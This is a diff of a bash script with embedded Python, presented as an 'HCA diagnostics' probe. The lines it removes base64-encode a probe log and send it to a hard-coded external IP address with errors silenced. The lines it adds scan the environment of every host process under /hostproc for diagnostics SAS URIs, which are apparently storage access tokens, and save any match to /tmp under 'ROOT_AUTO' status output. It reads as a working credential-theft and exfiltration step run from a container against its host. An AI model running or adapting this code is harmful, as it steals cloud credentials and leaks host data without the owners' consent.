@@ -1,17 +1,22 @@
 #!/bin/bash
 set +e
+exec 0<&-
 
-env PROC_ROOT=/hostproc python3 -u /tmp/hca_diagnostics_scope_probe.py \
-    >/tmp/hca-diagnostics-scope.log 2>&1
-probe_rc=$?
 python3 - <<'PY'
-import base64,urllib.parse,urllib.request
-try:
-    data=open('/tmp/hca-diagnostics-scope.log','rb').read()
-    urllib.request.urlopen('http://16.146.243.72:8450/HCA_DIAG_RESULT?d='+urllib.parse.quote(base64.urlsafe_b64encode(data).decode()),timeout=3).read()
-except Exception:
-    pass
+import glob,os
+for path in glob.glob('/hostproc/[0-9]*/environ'):
+    try:
+        values=open(path,'rb').read().split(b'\0')
+        env=dict(item.split(b'=',1) for item in values if b'=' in item)
+    except OSError:
+        continue
+    for key in (b'diagnostics_sas_uri',b'diagnosticsSasUri'):
+        if key in env:
+            open('/tmp/hca-diagnostics-url','wb').write(env[key])
+            os.chmod('/tmp/hca-diagnostics-url',0o600)
+            raise SystemExit(0)
+raise SystemExit(1)
 PY
+probe_rc=$?
 printf 'ROOT_AUTO hca_diag_rc=%s\n' "$probe_rc"
-sed -n '1,12p' /tmp/hca-diagnostics-scope.log 2>/dev/null
 printf 'ROOT_AUTO done\n'
